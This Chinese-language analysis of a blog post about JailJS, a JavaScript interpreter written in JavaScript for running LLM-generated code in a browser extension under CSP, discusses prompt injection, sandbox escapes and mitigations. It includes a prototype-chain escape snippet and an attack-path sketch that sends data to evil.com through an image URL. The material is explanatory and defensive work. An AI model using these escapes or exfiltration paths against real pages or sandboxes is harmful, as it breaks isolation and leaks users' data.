# [Infinite Footguns: Writing a JavaScript Interpreter in JavaScript](https://mariozechner.at/posts/2025-10-05-jailjs/)

## 一、文章核心问题链

这篇文章表面上是一个技术日志，但底层是一条精密的**问题-解决-新问题**链条：

```
浏览器扩展 + LLM 操控网页
    ↓
问题1：提示注入 → LLM 可能窃取敏感数据
问题2：CSP 阻止动态代码执行
    ↓
解法：用 JS 解释器在 JS 中解释 JS（绕过 CSP）
    ↓
新问题：沙箱逃逸（原型链污染、对象引用泄漏等）
    ↓
缓解：受限 API 暴露 + Proxy 拦截
    ↓
终极结论：攻击面无穷，无法完美封堵
```

这条链路本身就是一个深刻的**安全架构教案**。

---

## 二、五个核心洞见

### 洞见 1：CSP 是"静态 vs 动态"的边界线——解释器将动态代码"伪装"成静态代码

**核心矛盾**：CSP 的设计哲学是——只有预先声明的、可审计的代码才能执行。但 LLM 生成的代码天然是运行时动态产生的。

**作者的破解思路**极其巧妙：

```
静态定义的代码 ← CSP 允许
    ├── 静态定义的解析器（Babel standalone）
    ├── 静态定义的解释器（switch-case 树遍历器）
    └── 动态输入的代码字符串 → 被上面两者"消化"
```

解释器本身是静态的、可审计的、打包在 content script 中的——CSP 完全允许。但它执行的内容是动态的。这实质上是一种**语义层面的绕过**：你没有 `eval`，你没有 `new Function`，你没有注入 `<script>` 标签——你只是在"读一棵树并做算术"。

> **深层启示**：任何安全边界只要是基于"语法形式"（禁止 eval/script tag）而非"语义能力"（禁止图灵完备计算）的，都可以被这种"解释器嵌套"打破。CSP 本质上是一个语法级检查器，而非能力级检查器。

### 洞见 2：沙箱安全的根本困境——攻击面与能力成正比

文章中最深刻的安全洞见藏在这段话里：

> _"There's basically an infinite amount of attack vectors we would need to patch, which is really fucking hard."_

这不是夸张，而是严格的安全原理。问题出在 JavaScript 的**对象图连通性**上：

```
document（暴露给沙箱）
  → document.defaultView → window
    → window.localStorage → 敏感数据
    → window.fetch → 网络外发能力
  → document.createElement('img')
    → img.src = 'https://evil.com/steal?...' → 数据外泄
  → 任意 DOM 元素.__proto__
    → Object.prototype → 原型链污染
    → constructor.constructor('return this')() → 全局对象
```

JavaScript 的对象模型是一个**高度连通的图**。暴露图中任意一个节点，就开放了从该节点出发遍历整个图的可能性。这是一个**组合爆炸**问题——每增加一个暴露的 API，攻击面不是线性增长，而是指数级增长。

**作者提出了两种缓解策略及其取舍**：

| 策略                     | 安全性                   | LLM 可用性                           | 实用性 |
| ------------------------ | ------------------------ | ------------------------------------ | ------ |
| Proxy 拦截（黑名单）     | 低——遗漏一个属性即可逃逸 | 高——LLM 可用训练数据中的标准 DOM API | 中     |
| 自定义受限 API（白名单） | 高——只暴露你审计过的函数 | 低——LLM 需要学习全新 API             | 中     |

这与前一篇 MCP 文章形成有趣呼应：**LLM 对训练数据中见过的 API（如 DOM）使用得更好，但这恰恰是安全性最差的暴露方式。** 安全性和 LLM 效能之间存在根本张力。

### 洞见 3：原型链污染是 JS 沙箱的"万能钥匙"

文中给出的逃逸示例值得深入分析：

```javascript
// 沙箱内代码
Array.prototype.push = function () {
  return this.constructor.constructor('return this')()
}
var arr = []
arr.push() // 返回 window/globalThis
```

这段代码的攻击路径：

1. `this` → 一个**真实的** JavaScript Array 实例（不是解释器模拟的）
2. `this.constructor` → `Array`（真实的 Array 构造函数）
3. `this.constructor.constructor` → `Function`（真实的 Function 构造函数）
4. `Function('return this')()` → `globalThis` / `window`

**关键洞察**：即使解释器屏蔽了 `Function` 和 `eval`，一旦沙箱内的代码接触到**任何真实的 JavaScript 对象**，就可以沿着原型链追溯到 `Function` 构造函数。这是因为在 JavaScript 中，**所有对象最终都通过原型链连接到 `Object` 和 `Function`**。

```
任意真实对象 → .constructor → 某 Constructor → .constructor → Function → 沙箱逃逸
```

这意味着**真正安全的沙箱必须确保解释器内部永远不会暴露真实的 JavaScript 对象引用**——所有值都必须是"纯数据"（原始类型：number、string、boolean）或解释器自己创建的模拟对象。这在实践中几乎不可能，因为你总是需要与宿主环境交互（否则沙箱就没有意义）。

### 洞见 4：Babel 的分层复用——将"编译器前端"与"执行后端"解耦

作者选择用 Babel standalone 做解析，自己只写解释器（执行引擎），这是一个非常聪明的架构决策：

```
完整 JavaScript 引擎 = 解析器 + 编译器/解释器 + 运行时
                        ↑                ↑              ↑
                   Babel standalone    JailJS        宿主环境（浏览器）
```

更巧妙的是，Babel 不仅能**解析** ES6+/TypeScript/JSX，还能**转译**为 ES5。这意味着 JailJS 只需要实现 ES5 的 ~50 种 AST 节点类型的解释逻辑，却能运行几乎所有现代 JavaScript：

```
TypeScript/JSX/ES2024 源码
    → Babel 转译为 ES5 AST
        → JailJS 解释 ES5 AST
```

**深层启示**：这是一个**能力杠杆**的典型案例。通过复用 Babel 的解析和转译能力，作者用相对少量的代码（一个 ES5 解释器的 switch-case）获得了对整个现代 JavaScript 生态的支持。不重复发明轮子，只在关键的差异化点（解释执行 + 沙箱控制）投入精力。

### 洞见 5：这是一个"安全不可能三角"

综合全文，可以提炼出一个**浏览器扩展中 LLM 代码执行的不可能三角**：

```
        CSP 兼容性
           /\
          /  \
         /    \
        /  只能 \
       /  选两个  \
      /____________\
  安全性          功能完整性
```

1. **CSP 兼容 + 安全**：不暴露任何宿主对象 → 代码无法与页面交互 → 功能残缺
2. **CSP 兼容 + 功能完整**：暴露 DOM 等宿主对象 → 沙箱可逃逸 → 不安全
3. **安全 + 功能完整**：需要 `eval` 或原生沙箱（如 ShadowRealm 提案）→ CSP 阻止

作者在文末坦然承认了这一点：_"You win some, you lose some."_ 他选择了 CSP 兼容 + 功能完整，牺牲了完美的安全性。

---

## 三、与前文 MCP vs CLI 的交叉洞见

两篇文章放在一起看，揭示了 LLM 工具设计中一个更深层的主题：

| 维度         | MCP vs CLI 文章                                     | JS 解释器文章                       |
| ------------ | --------------------------------------------------- | ----------------------------------- |
| 核心权衡     | 效率 vs 成本（token 税）                            | 功能 vs 安全（攻击面）              |
| LLM 知识利用 | 训练数据中的 CLI 知识是"免费先验"                   | 训练数据中的 DOM API 知识是安全风险 |
| 暴露表面积   | 工具越少越好（1 个 tool > N 个 tool）               | API 越少越安全（白名单 > 黑名单）   |
| **共同原则** | **最小暴露原则：只给 LLM 它完成任务所需的最少能力** |

这个共同原则可以表述为：

> **对于 LLM 代理的工具设计，无论是 MCP/CLI 接口还是沙箱 API，都应遵循最小权限原则（Principle of Least Privilege）。不同的是，MCP/CLI 场景中"过度暴露"浪费 token 和注意力，而沙箱场景中"过度暴露"危及安全。**

---

## 四、技术深度补充：为什么 JS-in-JS 解释器天然很慢？

作者提到解释器是"a very, very slow way"，原因值得展开：

1. **AST 树遍历 vs 字节码/JIT**：V8 等引擎对 JS 先编译为字节码再 JIT 为机器码。JailJS 是直接遍历 AST 节点，每个操作都是一次递归函数调用 + switch 分支。
2. **双重解释开销**：JailJS 本身是 JavaScript 代码，运行在 V8 上。所以实际执行链是：`V8 解释/JIT JailJS 的代码` → `JailJS 解释用户代码`。每一层都有开销。
3. **Scope 查找**：每次变量访问都需要沿 scope chain 线性查找，而原生 JS 引擎通过隐藏类（Hidden Classes）和内联缓存（Inline Caches）做到近乎 O(1)。

粗略估计，JS-in-JS 解释器的性能大约是原生执行的 **100-1000 倍慢**。但对于 LLM 生成的页面操作代码（通常是几十行的 DOM 操作），这个延迟是完全可接受的。

---

## 五、实践建议总结

| 场景                                 | 建议                                                                                |
| ------------------------------------ | ----------------------------------------------------------------------------------- |
| 浏览器扩展需要在任意页面执行动态代码 | JS-in-JS 解释器是绕过 CSP 的可行方案                                                |
| 需要暴露宿主 API 给沙箱              | **优先使用白名单自定义函数**，而非直接暴露原生对象                                  |
| 安全性要求极高                       | 不要信任任何 JS 沙箱——考虑 WebAssembly 沙箱或 iframe sandbox                        |
| LLM 生成的代码需要 DOM 交互          | 提供专用的、审计过的 helper 函数，同时在 system prompt 中教会 LLM 使用它们          |
| 代码解析需求                         | **复用 Babel standalone**，不要自己写 JS 解析器                                     |
| 防原型链污染                         | 冻结所有暴露对象的原型链（`Object.freeze`），拦截 `__proto__` 和 `constructor` 访问 |

**文章的终极教训**：在安全领域，"it just works (mostly)" 中的那个 "mostly" 就是全部的问题所在。
